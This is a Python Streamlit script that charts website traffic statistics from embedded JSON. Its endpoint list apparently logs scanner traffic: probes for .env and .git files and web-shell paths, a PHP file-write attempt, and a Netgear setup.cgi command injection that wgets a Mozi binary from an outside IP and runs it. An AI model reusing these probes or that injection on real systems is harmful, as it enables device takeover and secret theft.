import streamlit as st
import pandas as pd
import altair as alt

# JSON data
data = {
    "last1h": 7,
    "last24h": 531,
    "last7d": 876,
    "last30d": 876,
    "postsByDay": {
        "2023-4-23": 55,
        "2023-4-24": 365,
        "2023-4-25": 456,
        "2023-4-22": 0,
        "2023-4-21": 0,
        "2023-4-20": 0,
        "2023-4-19": 0,
        "2023-4-18": 0,
        "2023-4-17": 0,
        "2023-4-16": 0,
        "2023-4-15": 0,
        "2023-4-14": 0,
        "2023-4-13": 0,
        "2023-4-12": 0,
        "2023-4-11": 0,
        "2023-4-10": 0,
        "2023-4-9": 0,
        "2023-4-8": 0,
        "2023-4-7": 0,
        "2023-4-6": 0,
        "2023-4-5": 0,
        "2023-4-4": 0,
        "2023-4-3": 0,
        "2023-4-2": 0,
        "2023-4-1": 0,
        "2023-3-31": 0,
        "2023-3-30": 0,
        "2023-3-29": 0,
        "2023-3-28": 0,
        "2023-3-27": 0
    },
    "endpoints": [
        {
            "url": "/",
            "requests": 148
        },
        {
            "url": "/s/",
            "requests": 126
        },
        {
            "url": "/wp-comments-post.php",
            "requests": 102
        },
        {
            "url": "/api/files/upload",
            "requests": 36
        },
        {
            "url": "/Core/Skin/Login.aspx",
            "requests": 32
        },
        {
            "url": "/.env",
            "requests": 29
        },
        {
            "url": "/favicon.ico",
            "requests": 19
        },
        {
            "url": "/api/stats",
            "requests": 15
        },
        {
            "url": "/wp-login.php",
            "requests": 9
        },
        {
            "url": "/geoip/",
            "requests": 8
        },
        {
            "url": "/client/get_targets",
            "requests": 7
        },
        {
            "url": "/upl.php",
            "requests": 7
        },
        {
            "url": "/robots.txt",
            "requests": 7
        },
        {
            "url": "/api/upload",
            "requests": 5
        },
        {
            "url": "/?p=44",
            "requests": 5
        },
        {
            "url": "/?p=91",
            "requests": 4
        },
        {
            "url": "/?p=58",
            "requests": 4
        },
        {
            "url": "/local/.env",
            "requests": 3
        },
        {
            "url": "/api/.env",
            "requests": 3
        },
        {
            "url": "/laravel/.env",
            "requests": 3
        },
        {
            "url": "/app/.env",
            "requests": 3
        },
        {
            "url": "/apps/.env",
            "requests": 3
        },
        {
            "url": "/core/.env",
            "requests": 3
        },
        {
            "url": "/shared/.env",
            "requests": 3
        },
        {
            "url": "/tftpboot/",
            "requests": 3
        },
        {
            "url": "/?p=27",
            "requests": 3
        },
        {
            "url": "/?p=62",
            "requests": 3
        },
        {
            "url": "/?p=13",
            "requests": 3
        },
        {
            "url": "/?p=8",
            "requests": 3
        },
        {
            "url": "/?p=64",
            "requests": 3
        },
        {
            "url": "/?p=28",
            "requests": 3
        },
        {
            "url": "/?p=73",
            "requests": 3
        },
        {
            "url": "/?p=38",
            "requests": 3
        },
        {
            "url": "/api/ai/vulgarity",
            "requests": 2
        },
        {
            "url": "/geoserver/web/",
            "requests": 2
        },
        {
            "url": "/systembc/password.php",
            "requests": 2
        },
        {
            "url": "/index.php?option=com_acym&ctrl=frontmails&task=setNewIconShare",
            "requests": 2
        },
        {
            "url": "//.env",
            "requests": 2
        },
        {
            "url": "/wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php",
            "requests": 2
        },
        {
            "url": "/humans.txt",
            "requests": 2
        },
        {
            "url": "/ads.txt",
            "requests": 2
        },
        {
            "url": "/.git/config",
            "requests": 2
        },
        {
            "url": "/.env.production",
            "requests": 2
        },
        {
            "url": "/docker/.env",
            "requests": 2
        },
        {
            "url": "/cms/.env",
            "requests": 2
        },
        {
            "url": "/live_env",
            "requests": 2
        },
        {
            "url": "/cp/.env",
            "requests": 2
        },
        {
            "url": "/.env.project",
            "requests": 2
        },
        {
            "url": "/enviroments/.env",
            "requests": 2
        },
        {
            "url": "/fedex/.env",
            "requests": 2
        },
        {
            "url": "/development/.env",
            "requests": 2
        },
        {
            "url": "/.env.development",
            "requests": 2
        },
        {
            "url": "/script/.env",
            "requests": 2
        },
        {
            "url": "/back/.env",
            "requests": 2
        },
        {
            "url": "/.env.prod",
            "requests": 2
        },
        {
            "url": "/application/.env",
            "requests": 2
        },
        {
            "url": "/.env.save",
            "requests": 2
        },
        {
            "url": "/admin-app/.env",
            "requests": 2
        },
        {
            "url": "/.env.old",
            "requests": 2
        },
        {
            "url": "/rest/.env",
            "requests": 2
        },
        {
            "url": "/sources/.env",
            "requests": 2
        },
        {
            "url": "/enviroments/.env.production",
            "requests": 2
        },
        {
            "url": "/system/.env",
            "requests": 2
        },
        {
            "url": "/private/.env",
            "requests": 2
        },
        {
            "url": "/.env.dist",
            "requests": 2
        },
        {
            "url": "/?p=39",
            "requests": 2
        },
        {
            "url": "/?p=66",
            "requests": 2
        },
        {
            "url": "/?p=16",
            "requests": 2
        },
        {
            "url": "/?p=23",
            "requests": 2
        },
        {
            "url": "/?p=12",
            "requests": 2
        },
        {
            "url": "/?p=10",
            "requests": 2
        },
        {
            "url": "/?p=2",
            "requests": 2
        },
        {
            "url": "/?p=31",
            "requests": 2
        },
        {
            "url": "/?p=68",
            "requests": 2
        },
        {
            "url": "/?p=47",
            "requests": 2
        },
        {
            "url": "/?p=78",
            "requests": 2
        },
        {
            "url": "/?p=21",
            "requests": 2
        },
        {
            "url": "/?p=93",
            "requests": 2
        },
        {
            "url": "/?p=29",
            "requests": 2
        },
        {
            "url": "/?p=76",
            "requests": 2
        },
        {
            "url": "/?p=41",
            "requests": 2
        },
        {
            "url": "/?p=20",
            "requests": 2
        },
        {
            "url": "/?p=40",
            "requests": 2
        },
        {
            "url": "/?p=65",
            "requests": 2
        },
        {
            "url": "/?p=84",
            "requests": 2
        },
        {
            "url": "/GponForm/diag_Form?images/",
            "requests": 1
        },
        {
            "url": "/boaform/admin/formLogin",
            "requests": 1
        },
        {
            "url": "/_html/main.asp",
            "requests": 1
        },
        {
            "url": "/conf/.env",
            "requests": 1
        },
        {
            "url": "/wp-content/.env",
            "requests": 1
        },
        {
            "url": "/wp-admin/.env",
            "requests": 1
        },
        {
            "url": "/library/.env",
            "requests": 1
        },
        {
            "url": "/new/.env",
            "requests": 1
        },
        {
            "url": "/vendor/.env",
            "requests": 1
        },
        {
            "url": "/old/.env",
            "requests": 1
        },
        {
            "url": "/blog/.env",
            "requests": 1
        },
        {
            "url": "/crm/.env",
            "requests": 1
        },
        {
            "url": "/admin/.env",
            "requests": 1
        },
        {
            "url": "/app/config/.env",
            "requests": 1
        },
        {
            "url": "/audio/.env",
            "requests": 1
        },
        {
            "url": "/cgi-bin/.env",
            "requests": 1
        },
        {
            "url": "/backend/.env",
            "requests": 1
        },
        {
            "url": "/src/.env",
            "requests": 1
        },
        {
            "url": "/base/.env",
            "requests": 1
        },
        {
            "url": "/vendor/laravel/.env",
            "requests": 1
        },
        {
            "url": "/storage/.env",
            "requests": 1
        },
        {
            "url": "/protected/.env",
            "requests": 1
        },
        {
            "url": "/newsite/.env",
            "requests": 1
        },
        {
            "url": "/www/.env",
            "requests": 1
        },
        {
            "url": "/sites/all/libraries/mailchimp/.env",
            "requests": 1
        },
        {
            "url": "/database/.env",
            "requests": 1
        },
        {
            "url": "/public/.env",
            "requests": 1
        },
        {
            "url": "/__tests__/test-become/.env",
            "requests": 1
        },
        {
            "url": "/redmine/.env",
            "requests": 1
        },
        {
            "url": "/gists/cache",
            "requests": 1
        },
        {
            "url": "/uploads/.env",
            "requests": 1
        },
        {
            "url": "/lib/.env",
            "requests": 1
        },
        {
            "url": "/sendgrid.env",
            "requests": 1
        },
        {
            "url": "/aws.env",
            "requests": 1
        },
        {
            "url": "/.env.example",
            "requests": 1
        },
        {
            "url": "/main/.env",
            "requests": 1
        },
        {
            "url": "/docs/.env",
            "requests": 1
        },
        {
            "url": "/client/.env",
            "requests": 1
        },
        {
            "url": "/.env.dev",
            "requests": 1
        },
        {
            "url": "/blogs/.env",
            "requests": 1
        },
        {
            "url": "/download/.env",
            "requests": 1
        },
        {
            "url": "/.env.php",
            "requests": 1
        },
        {
            "url": "/site/.env",
            "requests": 1
        },
        {
            "url": "/sites/.env",
            "requests": 1
        },
        {
            "url": "/web/.env",
            "requests": 1
        },
        {
            "url": "/provisioning/",
            "requests": 1
        },
        {
            "url": "/config/",
            "requests": 1
        },
        {
            "url": "/aastra/",
            "requests": 1
        },
        {
            "url": "/configs/",
            "requests": 1
        },
        {
            "url": "/xml/",
            "requests": 1
        },
        {
            "url": "/admin/",
            "requests": 1
        },
        {
            "url": "/etc/selinux",
            "requests": 1
        },
        {
            "url": "/3cx/",
            "requests": 1
        },
        {
            "url": "/tftpboot/polycom",
            "requests": 1
        },
        {
            "url": "/grandstream/",
            "requests": 1
        },
        {
            "url": "/etc/asterisk",
            "requests": 1
        },
        {
            "url": "/cisco/",
            "requests": 1
        },
        {
            "url": "/usr/lib/asterisk/modules/",
            "requests": 1
        },
        {
            "url": "/yealink/",
            "requests": 1
        },
        {
            "url": "/pbx/",
            "requests": 1
        },
        {
            "url": "/etc/",
            "requests": 1
        },
        {
            "url": "/prov/",
            "requests": 1
        },
        {
            "url": "/conf/",
            "requests": 1
        },
        {
            "url": "/provisioning/spa",
            "requests": 1
        },
        {
            "url": "/spa/",
            "requests": 1
        },
        {
            "url": "/updates/",
            "requests": 1
        },
        {
            "url": "/linksys/",
            "requests": 1
        },
        {
            "url": "/snom/",
            "requests": 1
        },
        {
            "url": "/asterisk/",
            "requests": 1
        },
        {
            "url": "/tools/",
            "requests": 1
        },
        {
            "url": "/polycom/",
            "requests": 1
        },
        {
            "url": "/digium/",
            "requests": 1
        },
        {
            "url": "/sip/",
            "requests": 1
        },
        {
            "url": "/ftp/",
            "requests": 1
        },
        {
            "url": "/phone/",
            "requests": 1
        },
        {
            "url": "/cfg/",
            "requests": 1
        },
        {
            "url": "/voice/",
            "requests": 1
        },
        {
            "url": "/release/",
            "requests": 1
        },
        {
            "url": "/users/",
            "requests": 1
        },
        {
            "url": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.92.166.133:43178/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1",
            "requests": 1
        },
        {
            "url": "/wordpress",
            "requests": 1
        },
        {
            "url": "/wp",
            "requests": 1
        },
        {
            "url": "/bc",
            "requests": 1
        },
        {
            "url": "/bk",
            "requests": 1
        },
        {
            "url": "/backup",
            "requests": 1
        },
        {
            "url": "/old",
            "requests": 1
        },
        {
            "url": "/new",
            "requests": 1
        },
        {
            "url": "/main",
            "requests": 1
        },
        {
            "url": "/home",
            "requests": 1
        },
        {
            "url": "/xmlrpc.php",
            "requests": 1
        },
        {
            "url": "/blog/xmlrpc.php",
            "requests": 1
        },
        {
            "url": "/sugar_version.json",
            "requests": 1
        },
        {
            "url": "/wp-info.php",
            "requests": 1
        },
        {
            "url": "/wsa.php",
            "requests": 1
        },
        {
            "url": "/wso.php",
            "requests": 1
        },
        {
            "url": "/alwso.php",
            "requests": 1
        },
        {
            "url": "/local.php",
            "requests": 1
        },
        {
            "url": "/ffAA531.php",
            "requests": 1
        },
        {
            "url": "/bala.php",
            "requests": 1
        },
        {
            "url": "/inputs1122.php",
            "requests": 1
        },
        {
            "url": "/oldindex.php",
            "requests": 1
        },
        {
            "url": "/lol.php",
            "requests": 1
        },
        {
            "url": "/wp-fox.php",
            "requests": 1
        },
        {
            "url": "/autoload_classmap.php",
            "requests": 1
        },
        {
            "url": "/511.php",
            "requests": 1
        },
        {
            "url": "/wp-class.php",
            "requests": 1
        },
        {
            "url": "/wso112233.php",
            "requests": 1
        },
        {
            "url": "/logs.php",
            "requests": 1
        },
        {
            "url": "/wp-2019.php",
            "requests": 1
        },
        {
            "url": "/shell.php",
            "requests": 1
        },
        {
            "url": "/.wp-back.phP",
            "requests": 1
        },
        {
            "url": "/Anon.php",
            "requests": 1
        },
        {
            "url": "/wp-log.php",
            "requests": 1
        },
        {
            "url": "/.wp-themes.php",
            "requests": 1
        },
        {
            "url": "/filemanager/dialog.php",
            "requests": 1
        },
        {
            "url": "/assets/filemanager/dialog.php",
            "requests": 1
        },
        {
            "url": "/phpmyadmin/",
            "requests": 1
        },
        {
            "url": "/wp-admin/style.php?sig=rename",
            "requests": 1
        },
        {
            "url": "/style.php?sig=rename",
            "requests": 1
        },
        {
            "url": "/frontend_dev.php/$",
            "requests": 1
        },
        {
            "url": "/debug/default/view?panel=config",
            "requests": 1
        },
        {
            "url": "/config.json",
            "requests": 1
        },
        {
            "url": "/.json",
            "requests": 1
        },
        {
            "url": "/info.php",
            "requests": 1
        },
        {
            "url": "/phpinfo.php",
            "requests": 1
        },
        {
            "url": "/_profiler/phpinfo",
            "requests": 1
        },
        {
            "url": "/?phpinfo=1",
            "requests": 1
        },
        {
            "url": "/?p=32",
            "requests": 1
        },
        {
            "url": "/?p=98",
            "requests": 1
        },
        {
            "url": "/?p=60",
            "requests": 1
        },
        {
            "url": "/?p=34",
            "requests": 1
        },
        {
            "url": "/?p=5",
            "requests": 1
        },
        {
            "url": "/?p=25",
            "requests": 1
        },
        {
            "url": "/?p=18",
            "requests": 1
        },
        {
            "url": "/?p=52",
            "requests": 1
        },
        {
            "url": "/?p=24",
            "requests": 1
        },
        {
            "url": "/?p=59",
            "requests": 1
        },
        {
            "url": "/?p=22",
            "requests": 1
        },
        {
            "url": "/?p=15",
            "requests": 1
        },
        {
            "url": "/?p=95",
            "requests": 1
        },
        {
            "url": "/?p=80",
            "requests": 1
        },
        {
            "url": "/?p=82",
            "requests": 1
        },
        {
            "url": "/?p=96",
            "requests": 1
        },
        {
            "url": "/?p=46",
            "requests": 1
        },
        {
            "url": "/?p=57",
            "requests": 1
        },
        {
            "url": "/?p=36",
            "requests": 1
        },
        {
            "url": "/?p=1",
            "requests": 1
        },
        {
            "url": "/?p=67",
            "requests": 1
        },
        {
            "url": "/?p=83",
            "requests": 1
        },
        {
            "url": "/?p=61",
            "requests": 1
        },
        {
            "url": "/?p=81",
            "requests": 1
        },
        {
            "url": "/?p=42",
            "requests": 1
        },
        {
            "url": "/?p=90",
            "requests": 1
        },
        {
            "url": "/?p=94",
            "requests": 1
        },
        {
            "url": "/?p=50",
            "requests": 1
        },
        {
            "url": "/?p=63",
            "requests": 1
        },
        {
            "url": "/?p=4",
            "requests": 1
        },
        {
            "url": "/?p=56",
            "requests": 1
        },
        {
            "url": "/?p=75",
            "requests": 1
        },
        {
            "url": "/manager/text/list",
            "requests": 1
        },
        {
            "url": "/manager/html",
            "requests": 1
        }
    ]
}

def display_data(data):
    # Display time-based stats
    st.write("## Time-based stats")
    time_based_stats = pd.DataFrame({
        "Time Range": ["Last 1 hour", "Last 24 hours", "Last 7 days", "Last 30 days"],
        "Posts": [data["last1h"], data["last24h"], data["last7d"], data["last30d"]]
    })
    st.write(alt.Chart(time_based_stats).mark_bar().encode(
        x="Time Range",
        y="Posts"
    ))

    # Display posts by day
    st.write("## Posts by day")
    posts_by_day = pd.DataFrame({
        "Date": list(data["postsByDay"].keys()),
        "Posts": list(data["postsByDay"].values())
    })
    st.write(alt.Chart(posts_by_day).mark_line().encode(
        x=alt.X("Date:T", axis=alt.Axis(title="Date")),
        y=alt.Y("Posts:Q", axis=alt.Axis(title="Posts"))
    ))

    # Display endpoint requests
    st.write("## Endpoint requests")
    endpoints = pd.DataFrame(data["endpoints"])
    pie_chart = alt.Chart(endpoints).mark_arc(innerRadius=50).encode(
        theta='requests:Q',
        color='url:N',
        tooltip=['url', 'requests']
    )

    labels = alt.Chart(endpoints).mark_text(align='left', baseline='middle', dx=7).encode(
        x=alt.X('dx:Q', axis=alt.Axis(title='dx')),
        y=alt.Y('dy:Q', axis=alt.Axis(title='dy')),
        theta='requests:Q',
        radius=alt.value(100),
        text='url:N'
    )

    st.altair_chart(pie_chart + labels, use_container_width=True)



# Create the Streamlit app
st.title("Website Stats Dashboard")
display_data(data)
